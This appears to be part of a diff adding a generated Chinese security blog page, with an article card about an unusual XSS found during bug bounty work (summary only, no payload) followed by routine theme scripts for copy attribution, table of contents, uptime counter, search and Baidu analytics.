+                        <span class="card-title">【经验总结】记录一次有点儿不一样的XSS</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            最近在挖SRC的时候，碰到一个有点儿不一样的XSS，在此简单记录一下。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-category">
+                                    经验总结
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SRC/">
+                        <span class="chip bg-color">SRC</span>
+                    </a>
+                    
+                    <a href="/tags/XSS/">
+                        <span class="chip bg-color">XSS</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+                        <span class="chip bg-color">经验总结</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Teams Six<br />'
+            + '文章作者: Teams Six<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">150.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "12";
+                    var startDate = "19";
+                    var startHour = "7";
+                    var startMinute = "7";
+                    var startSecond = "7";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/teamssix" class="tooltipped" target="_blank" data-tooltip="访问我的 GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:teamssix@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/TeamsSix" class="tooltipped" target="_blank" data-tooltip="关注我的 Twitter" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" class="tooltipped" target="_blank" data-tooltip="关注我的微信公众号" data-position="top" data-delay="50">
+        <i class="fab fa-weixin"></i>
+    </a>
+
+
+
+    <a href="https://blog.csdn.net/qq_37683287" class="tooltipped" target="_blank" data-tooltip="访问我的 CSDN" data-position="top" data-delay="50">
+        <i class="fab fa-cuttlefish"></i>
+    </a>
+
+
+
+    <a href="https://www.zhihu.com/people/teamssix" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fab fa-zhihu1">知</i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?8bab20886c3df9c0d832a9b6aee45740";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
